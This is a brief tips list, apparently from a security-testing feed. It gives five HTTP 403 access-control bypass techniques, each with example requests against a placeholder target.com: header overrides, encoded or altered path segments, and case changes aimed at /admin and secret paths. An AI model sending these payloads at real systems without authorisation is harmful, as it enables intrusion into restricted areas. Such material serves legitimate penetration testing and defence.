5 Ways To Bypass 403: 

1. Add X-Original-URL to request
Ex: 
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin

2. Add %2e before the endpoint
Ex: http://target.com/%2e/admin 

3. Add dots, slashes or semicolons in the URL
Ex: 
http://target.com/secret/. 
http://target.com//secret//
http://target.com/./secret/.. 
http://target.com/;/secret 
http://target.com/.;/secret 
http://target.com//;//secret 

4. Add ..;/ after the endpoint
Ex: http://target.com/admin..;/

5. Use uppercase letters
Ex: http://target.com/aDmIN
